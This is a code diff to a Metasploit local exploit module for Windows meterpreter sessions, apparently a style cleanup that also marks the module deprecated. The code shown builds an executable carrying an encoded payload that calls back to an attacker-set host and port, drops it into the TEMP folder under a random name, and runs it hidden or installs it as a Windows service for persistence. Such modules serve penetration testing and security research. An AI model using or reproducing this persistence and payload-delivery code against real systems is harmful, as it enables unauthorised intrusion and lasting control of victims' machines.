@@ -10,12 +10,14 @@ class MetasploitModule < Msf::Exploit::Local
   include Msf::Post::Windows::Powershell
   include Msf::Post::Windows::Powershell::DotNet
   include Msf::Post::File
+  include Msf::Exploit::Deprecated
+  moved_from 'exploits/windows/local/ps_persist'
 
   def initialize(info = {})
     super(
       update_info(
         info,
-        'Name' => "Powershell Payload Execution",
+        'Name' => 'Powershell Payload Execution',
         'Description' => %q{
           This module generates a dynamic executable on the session host using .NET templates.
           Code is pulled from C# templates and impregnated with a payload before being
@@ -35,8 +37,8 @@ class MetasploitModule < Msf::Exploit::Local
           'EncoderType' => Msf::Encoder::Type::AlphanumMixed,
           'EncoderOptions' =>
               {
-                'BufferRegister' => 'EAX',
-              },
+                'BufferRegister' => 'EAX'
+              }
         },
         'Platform' => [ 'windows' ],
         'SessionTypes' => [ 'meterpreter' ],
@@ -83,13 +85,13 @@ class MetasploitModule < Msf::Exploit::Local
 
   def exploit
     # Make sure we meet the requirements before running the script
-    if !(session.type == "meterpreter" || have_powershell?)
-      print_error("Incompatible Environment")
+    if !(session.type == 'meterpreter' || have_powershell?)
+      print_error('Incompatible Environment')
       return
     end
     # Havent figured this one out yet, but we need a PID owned by a user, cant steal tokens either
     if client.sys.config.is_system?
-      print_error("Cannot run as system")
+      print_error('Cannot run as system')
       return
     end
 
@@ -99,7 +101,7 @@ class MetasploitModule < Msf::Exploit::Local
 
     com_opts = {}
     com_opts[:net_clr] = 4.0 # Min .NET runtime to load into a PS session
-    com_opts[:target] = datastore['OUTPUT_TARGET'] || session.sys.config.getenv('TEMP') + "\\#{Rex::Text.rand_text_alpha(rand(8) + 8)}.exe"
+    com_opts[:target] = datastore['OUTPUT_TARGET'] || session.sys.config.getenv('TEMP') + "\\#{Rex::Text.rand_text_alpha(rand(8..15))}.exe"
     com_opts[:payload] = payload_script # payload.encoded
     vprint_good com_opts[:payload].length.to_s
 
@@ -130,7 +132,7 @@ class MetasploitModule < Msf::Exploit::Local
     begin
       size = session.fs.file.stat(com_opts[:target].gsub('\\', '\\\\')).size
       vprint_good("File #{com_opts[:target].gsub('\\', '\\\\')} found, #{size}kb")
-    rescue
+    rescue StandardError
       print_error("File #{com_opts[:target].gsub('\\', '\\\\')} not found")
       return
     end
@@ -140,7 +142,7 @@ class MetasploitModule < Msf::Exploit::Local
       if datastore['SVC_GEN']
         service_create(datastore['SVC_NAME'], datastore['SVC_DNAME'], com_opts[:target].gsub('\\', '\\\\'), startup = 2, server = nil)
         if service_start(datastore['SVC_NAME']).to_i == 0
-          vprint_good("Service Started")
+          vprint_good('Service Started')
         end
       else
         session.sys.process.execute(com_opts[:target].gsub('\\', '\\\\'), nil, { 'Hidden' => true, 'Channelized' => true })
@@ -154,17 +156,17 @@ class MetasploitModule < Msf::Exploit::Local
   def payload_script
     pay_mod = framework.payloads.create(datastore['PAYLOAD'])
     payload = pay_mod.generate_simple(
-      "BadChars" => '',
-      "Format" => 'raw',
-      "Encoder" => 'x86/alpha_mixed',
-      "ForceEncode" => true,
-      "Options" =>
+      'BadChars' => '',
+      'Format' => 'raw',
+      'Encoder' => 'x86/alpha_mixed',
+      'ForceEncode' => true,
+      'Options' =>
        {
          'LHOST' => datastore['LHOST'],
          'LPORT' => datastore['LPORT'],
          'EXITFUNC' => 'thread',
          'BufferRegister' => 'EAX'
-       },
+       }
     )
 
     # To ensure compatibility out payload should be US-ASCII
